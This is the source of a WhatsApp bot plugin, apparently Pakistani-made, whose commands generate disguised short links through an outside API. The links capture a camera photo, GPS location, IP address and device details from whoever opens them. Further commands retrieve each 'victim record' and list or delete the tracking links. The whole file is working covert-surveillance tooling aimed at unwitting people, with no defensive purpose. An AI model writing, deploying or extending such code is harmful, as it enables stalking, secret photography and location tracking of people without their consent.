// plugins/camtrack.js
'use strict';

/**
 * MR SAQIB MD :: Stealth Camera & Telemetry Intelligence Plugin
 * ============================================================================
 * Official Integration with Live API: https://earnpk92-two.vercel.app/api/shorten
 * Features:
 *   - Native Flow Interactive WhatsApp Buttons (📸 Check Record, 📋 Copy Link)
 * ============================================================================
 */

const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { cmd } = require('../command');

const DEFAULT_API_BASE = 'https://earnpk92-two.vercel.app';

function getApiBaseUrl() {
    let base = process.env.CAMERA_API_URL || DEFAULT_API_BASE;
    return base.replace(/\/+$/, '');
}

function extractShortCode(input) {
    if (!input) return '';
    let clean = input.trim();
    if (clean.includes('/')) {
        const parts = clean.split('/').filter(Boolean);
        clean = parts[parts.length - 1];
    }
    return clean.replace(/[^A-Za-z0-9_-]/g, '');
}

function formatBattery(rawLevel, isCharging) {
    if (rawLevel === null || rawLevel === undefined || rawLevel === '') return 'N/A';
    const num = parseFloat(rawLevel);
    if (isNaN(num)) return 'N/A';
    const pct = num <= 1.0 ? Math.round(num * 100) : Math.round(num);
    const chargingIcon = isCharging ? ' ⚡ (Charging)' : '';
    return `${pct}%${chargingIcon}`;
}

async function sendInteractiveButtons(conn, to, bodyText, buttons, quotedMsg, options = {}) {
    try {
        const interactiveMessage = {
            body: { text: bodyText },
            footer: { text: options.footer || "MR SAQIB MD" },
            header: options.header ? { title: options.header, hasMediaAttachment: false } : undefined,
            nativeFlowMessage: {
                buttons: buttons,
                messageVersion: 1
            }
        };

        const msgObj = generateWAMessageFromContent(to, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: interactiveMessage
                }
            }
        }, { quoted: quotedMsg });

        await conn.relayMessage(to, msgObj.message, { messageId: msgObj.key.id });
        return true;
    } catch (e) {
        console.warn('[Plugin Interactive Button Relay Fallback]:', e.message);
        await conn.sendMessage(to, { text: bodyText }, { quoted: quotedMsg });
        return false;
    }
}

/**
 * 📸 .camlink <targetUrl> [alias]
 */
cmd({
    pattern: "camlink",
    alias: ["camtrack", "camtrap", "trackurl", "camshot"],
    desc: "📷 Generate stealth camera & GPS intelligence short link",
    react: "📸",
    category: "tools",
    use: '.camlink <destination_url> [custom_alias]',
    filename: __filename
},
async (conn, mek, m, { from, reply, args, senderNumber }) => {
    const targetUrl = args[0]?.trim();
    const customAlias = args[1]?.trim() || '';
    const sender = senderNumber || '923468616487';

    if (!targetUrl || (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://'))) {
        return reply("❌ *Usage:* `.camlink <url> [alias]`\n*Example:* `.camlink https://youtube.com`");
    }

    try {
        const apiUrl = `${getApiBaseUrl()}/api/shorten`;
        const payload = {
            longUrl: targetUrl,
            customAlias: customAlias || undefined,
            phoneNumber: sender,
            deviceId: `wa-${sender}`,
            captureCamera: true,
            captureLocation: true,
            animationType: 'ring',
            animationText: 'CONNECTING'
        };

        const response = await axios.post(apiUrl, payload, {
            timeout: 15000,
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'WhatsAppBot-CameraTracker/1.0'
            }
        });

        const resData = response.data;
        if (!resData || !resData.success) {
            throw new Error(resData?.error || 'Link generation failed on server');
        }

        const shortUrl = resData.shortUrl;
        const code = resData.data?.short_code || extractShortCode(shortUrl);

        const cleanMessage =
`🔗 *TRACKING LINK (COPY & SEND):*
${shortUrl}

🏷️ *Code:* \`${code}\`
🎯 *Target:* ${targetUrl}
📸 *Check Record:* \`.camcheck ${code}\``;

        await reply(cleanMessage);
    } catch (err) {
        console.error('[CamTrack Plugin Error]:', err.message);
        const errorMsg = err.response?.data?.message || err.response?.data?.error || err.message;
        await reply(`❌ *Error:* ${errorMsg}`);
    }
});

/**
 * 🔎 .camcheck <shortCode>
 */
cmd({
    pattern: "camcheck",
    alias: ["caminfo", "camresult", "camlog", "victim"],
    desc: "🔎 Retrieve victim photo, GPS coordinates & hardware info",
    react: "🔍",
    category: "tools",
    use: '.camcheck <short_code|url>',
    filename: __filename
},
async (conn, mek, m, { from, reply, args }) => {
    const rawInput = args[0]?.trim();
    const shortCode = extractShortCode(rawInput);

    if (!shortCode) {
        return reply("❌ *Usage:* `.camcheck <code_or_link>`\n*Example:* `.camcheck YwN2sCL`");
    }

    try {
        const apiUrl = `${getApiBaseUrl()}/api/analytics?shortCode=${encodeURIComponent(shortCode)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        const resData = response.data;

        if (!resData || !resData.success) {
            throw new Error(resData?.error || 'Failed to fetch link telemetry');
        }

        const visits = Array.isArray(resData.data) ? resData.data : [];

        if (visits.length === 0) {
            const noRecordText = `⏳ *No Record Found Yet for:* \`${shortCode}\`\n\nAbhi tak victim ne link open nahi kiya.\nJaise hi link khulay ga, yahan photo aur location aa jayegi.\n\n🔎 *Check again:* \`.camcheck ${shortCode}\``;
            return await reply(noRecordText);
        }

        const latest = visits[0];
        const totalVisits = visits.length;

        const hasGps = latest.latitude && latest.longitude;
        const mapsUrl = hasGps
            ? `https://www.google.com/maps?q=${latest.latitude},${latest.longitude}`
            : 'Permission Denied / N/A';

        const photoUrl = latest.captured_image || latest.image || null;
        const visitTime = latest.created_at ? new Date(latest.created_at).toLocaleTimeString() : 'Just now';

        const reportText =
`🚨 *VICTIM RECORD CAPTURED!* (${totalVisits} Click)

📍 *GPS Maps:* ${mapsUrl}
🌐 *IP & City:* ${latest.ip_address || 'Unknown'} (${latest.location_name || latest.city || 'Unknown'})
📱 *Device:* ${latest.device_model || latest.device_type || 'Mobile'} | ${latest.os || 'OS'}
🌐 *Browser:* ${latest.browser || 'Browser'}
🔋 *Battery:* ${formatBattery(latest.battery_level, latest.is_charging)}
🕒 *Time:* ${visitTime}
${!photoUrl ? '⚠️ *Camera:* Permission denied by user' : ''}`.trim();

        if (photoUrl) {
            try {
                if (photoUrl.startsWith('data:image')) {
                    const base64Data = photoUrl.split(',')[1];
                    const buffer = Buffer.from(base64Data, 'base64');
                    await conn.sendMessage(from, {
                        image: buffer,
                        caption: reportText
                    }, { quoted: mek });
                    return;
                } else if (photoUrl.startsWith('http://') || photoUrl.startsWith('https://')) {
                    await conn.sendMessage(from, {
                        image: { url: photoUrl },
                        caption: reportText
                    }, { quoted: mek });
                    return;
                }
            } catch (imgErr) {
                console.warn('[CamCheck Image Send Warning]:', imgErr.message);
            }
        }

        // If no photo or fallback, send clean text report
        await reply(reportText);

    } catch (err) {
        console.error('[CamCheck Plugin Error]:', err.message);
        const errorMsg = err.response?.data?.message || err.response?.data?.error || err.message;
        await reply(`❌ *Error:* ${errorMsg}`);
    }
});

/**
 * 📋 .camlinks
 */
cmd({
    pattern: "camlinks",
    alias: ["mycamlinks", "camlist"],
    desc: "📋 View all active camera tracking links created by you",
    react: "📋",
    category: "tools",
    use: '.camlinks',
    filename: __filename
},
async (conn, mek, m, { from, reply, senderNumber }) => {
    const sender = senderNumber || '923468616487';

    try {
        const apiUrl = `${getApiBaseUrl()}/api/links?phoneNumber=${encodeURIComponent(sender)}&deviceId=wa-${encodeURIComponent(sender)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        const resData = response.data;

        if (!resData || !resData.success) {
            throw new Error(resData?.error || 'Failed to fetch user links');
        }

        const links = Array.isArray(resData.links) ? resData.links : [];

        if (links.length === 0) {
            return reply("📋 *No Links Found.*\nNaya link banane ke liye: `.camlink <url>`");
        }

        let listText = `📋 *YOUR TRACKING LINKS (${links.length}):*\n\n`;
        links.slice(0, 10).forEach((link, idx) => {
            const short = `${getApiBaseUrl()}/${link.short_code}`;
            listText += `${idx + 1}. *Code:* \`${link.short_code}\`\n`;
            listText += `   🔗 ${short}\n`;
            listText += `   🔎 Check: \`.camcheck ${link.short_code}\`\n\n`;
        });

        await reply(listText.trim());

    } catch (err) {
        console.error('[CamLinks Plugin Error]:', err.message);
        await reply(`❌ *Error:* ${err.message}`);
    }
});

/**
 * 🗑️ .camdel <shortCode>
 */
cmd({
    pattern: "camdel",
    alias: ["delcamlink"],
    desc: "🗑️ Delete tracking link and recorded telemetry",
    react: "🗑️",
    category: "tools",
    use: '.camdel <short_code>',
    filename: __filename
},
async (conn, mek, m, { from, reply, args, senderNumber }) => {
    const rawInput = args[0]?.trim();
    const shortCode = extractShortCode(rawInput);
    const sender = senderNumber || '923468616487';

    if (!shortCode) {
        return reply("❌ *Usage:* `.camdel <code>`\n*Example:* `.camdel YwN2sCL`");
    }

    try {
        const apiUrl = `${getApiBaseUrl()}/api/links/${encodeURIComponent(shortCode)}?phoneNumber=${encodeURIComponent(sender)}&deviceId=wa-${encodeURIComponent(sender)}`;
        const response = await axios.delete(apiUrl, { timeout: 15000 });

        if (response.data && response.data.success) {
            await reply(`✅ Link \`${shortCode}\` aur uske records delete ho gaye.`);
        } else {
            throw new Error(response.data?.error || 'Deletion failed');
        }
    } catch (err) {
        await reply(`❌ *Error:* ${err.response?.data?.error || err.message}`);
    }
});
